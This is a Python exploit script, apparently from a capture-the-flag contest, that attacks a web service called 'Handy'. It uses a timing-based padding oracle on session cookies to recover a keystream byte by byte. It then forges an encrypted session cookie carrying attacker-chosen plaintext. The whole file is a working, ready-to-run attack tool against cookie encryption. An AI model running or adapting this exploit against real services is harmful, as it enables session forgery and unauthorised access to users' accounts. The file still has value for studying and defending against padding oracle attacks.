#!/usr/bin/env python3

import argparse
import base64
import logging
import os
import requests
import time
import uuid
import binascii

class Oracle:
  def __init__(self, url):
    self.url = url

  def GetCandidates(self, user_id, message, index):
    timings = dict()
    for byte_value in range(256):
      message[index] = byte_value
      cookie = self._GetCookieValue(user_id, message)
      timings[byte_value] = self._GetTiming(cookie)
    logging.info('Max timing: %f', max(timings.values()))
    return [ max(timings.items(), key=lambda t: t[1])[0] ]

  def _GetCookieValue(self, user_id, message):
    return base64.b64encode(user_id + message).decode('utf-8')

  def _GetTiming(self, cookie):
    start_time = time.time()
    r = requests.get(self.url, cookies={'session': cookie})
    elapsed = time.time() - start_time
    logging.debug('Response status code: %d, elapsed time: %f', r.status_code, elapsed)
    return elapsed

def encrypt(message, user_id, oracle, block_size):
  ct = bytearray()
  ks = bytearray()
  msg_bytes = base64.b64decode(message)
  len_to_find = len(msg_bytes) + 4
  for block_idx in range((len_to_find + block_size - 1) // block_size):
    logging.info('Restoring block #%d', block_idx)
    ct.extend(os.urandom(block_size))
    ks.extend(b'\x00' * block_size)

    for pad_size in range(1, block_size + 1):
      byte_idx = len(ct) - pad_size
      logging.info('Restoring byte #%d', byte_idx)
      candidates = oracle.GetCandidates(user_id, ct, byte_idx)
      if byte_idx == len(ct) - 1 and len(candidates) > 1:
        logging.info('Got multiple values for the last byte, re-rolling')
        ct[byte_idx - 1] ^= 0xFF
        candidates = list(set(candidates) & set(oracle.GetCandidates(user_id, ct, byte_idx)))
      if len(candidates) != 1:
        logging.error('Failed to obtain correct number of candidates: %s', candidates)
        logging.error('Current keystream: %s', ks)
        return None
      ct[byte_idx] = candidates[0]
      ks[byte_idx] = candidates[0] ^ pad_size
      for i in range(pad_size):
        ct[byte_idx + i] ^= pad_size
        ct[byte_idx + i] ^= pad_size + 1
  logging.info('Keystream: %s', base64.b64encode(ks).decode('utf-8'))

  pt = bytearray(binascii.crc32(msg_bytes).to_bytes(4, byteorder='big'))
  pt.extend(msg_bytes)
  pad_size = block_size - len(pt) % block_size
  pt.extend(bytes([pad_size]) * pad_size)
  return bytes(l ^ r for l, r in zip(pt, ks))


if __name__ == "__main__":
  logging.basicConfig(format='%(levelname)s %(asctime)s: %(message)s', level=logging.INFO)

  parser = argparse.ArgumentParser(description='Exploit of Padding Oracle Attack for Handy service')
  parser.add_argument('--block_size', default=16, type=int, help='Block length')
  parser.add_argument('--url', default='http://localhost:8080', help='URL to hack')
  parser.add_argument('--message', required=True, type=str, help='Base64-encoded plain-text cookie to be fabricated')
  parser.add_argument('--user_id', required=True, type=str, help='UUID of the cookie')
  args = parser.parse_args()

  user_id = uuid.UUID(args.user_id).bytes
  oracle = Oracle(args.url)
  encrypted = encrypt(args.message, user_id, oracle, args.block_size)
  logging.info('Encrypted data: %s', base64.b64encode(encrypted).decode('utf-8'))
  logging.info('Cookie: %s', base64.b64encode(user_id + encrypted).decode('utf-8'))
